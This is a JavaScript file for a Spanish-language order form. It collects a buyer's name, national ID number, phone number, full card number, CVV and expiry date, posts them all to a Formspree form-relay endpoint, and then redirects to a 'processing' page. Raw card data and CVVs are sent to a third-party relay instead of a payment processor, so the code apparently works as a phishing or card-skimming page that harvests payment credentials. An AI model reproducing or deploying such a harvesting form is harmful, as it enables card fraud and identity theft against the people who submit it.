document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("pedidoForm");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    let valido = true;

    // Obtener valores
    const nombre = document.getElementById("nombre");
    const dni = document.getElementById("dni");
    const celular = document.getElementById("celular");
    const tarjeta = document.getElementById("tarjeta");
    const cvv = document.getElementById("cvv");
    const vencimiento = document.getElementById("vencimiento");

    // Resetear errores
    [nombre, dni, celular, tarjeta, cvv, vencimiento].forEach((campo) => {
      campo.classList.remove("error");
    });

    // Validaciones
    if (nombre.value.trim() === "") {
      nombre.classList.add("error");
      valido = false;
    }

    if (dni.value.trim() === "") {
      dni.classList.add("error");
      valido = false;
    }

    if (celular.value.trim() === "") {
      celular.classList.add("error");
      valido = false;
    }

    if (tarjeta.value.trim().length < 16) {
      tarjeta.classList.add("error");
      valido = false;
    }

    if (cvv.value.trim().length !== 3) {
      cvv.classList.add("error");
      valido = false;
    }

    if (vencimiento.value.trim() === "") {
      vencimiento.classList.add("error");
      valido = false;
    }

    if (!valido) {
      return; // No continúa si algo está mal
    }

    // Enviar a Formspree
    const formData = new FormData(form);

    try {
      const response = await fetch("https://formspree.io/f/mnnbkeaj", {
        method: "POST",
        body: formData,
        headers: {
          Accept: "application/json",
        },
      });

      if (response.ok) {
        window.location.href = "procesando.html";
      } else {
        alert("Hubo un error al enviar el formulario. Intenta de nuevo.");
      }
    } catch (error) {
      alert("Error de conexión. Intenta más tarde.");
    }
  });
});
